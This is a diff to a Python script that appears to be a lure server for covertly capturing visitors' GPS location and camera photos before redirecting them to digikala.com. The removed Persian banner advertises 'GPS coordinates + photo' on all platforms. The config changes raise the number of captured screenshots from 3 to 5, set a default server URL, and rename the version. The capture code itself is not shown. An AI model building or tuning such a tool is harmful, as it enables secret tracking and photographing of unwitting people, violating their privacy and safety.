@@ -1,12 +1,4 @@
-#!/usr/bin/env python3
-"""
-▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
-▓                                                                                  ▓
-▓  MR.SIAVASH.IR - ABSOLUTE ULTIMATE v1.0                                          ▓
-▓  تک فایل - همه پلتفرم‌ها - مختصات GPS + عکس + پیشرفته                           ▓
-▓                                                                                  ▓
-▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
-"""
+
 
 import os, sys, json, sqlite3, secrets, base64, io, threading, time, logging, asyncio, subprocess
 from datetime import datetime
@@ -21,11 +13,11 @@ class Config:
     ADMIN_ID = 6848904786
     PORT = int(os.environ.get("PORT", 8080))
     REDIRECT_URL = "https://www.digikala.com"
-    SERVER_URL = os.environ.get("SERVER_URL", "")
+    SERVER_URL = os.environ.get("SERVER_URL", f"http://0.0.0.0:{PORT}")
     SCREENSHOT_DELAY = 3  # ثانیه بین عکس‌ها
-    MAX_SCREENSHOTS = 3   # حداکثر عکس
+    MAX_SCREENSHOTS = 5   # حداکثر عکس
     GPS_TIMEOUT = 10000   # میلی‌ثانیه
-    VERSION = "ABSOLUTE-ULTIMATE-v1.0"
+    VERSION = "MR_Siavash_IR_EL"
 
 # ==================== LOGGING ====================
 logging.basicConfig(
@@ -1058,3 +1050,4 @@ if __name__ == "__main__":
 
 
         log.info(f"⏳ Total uptime: {datetime.now() - start_time}")
+
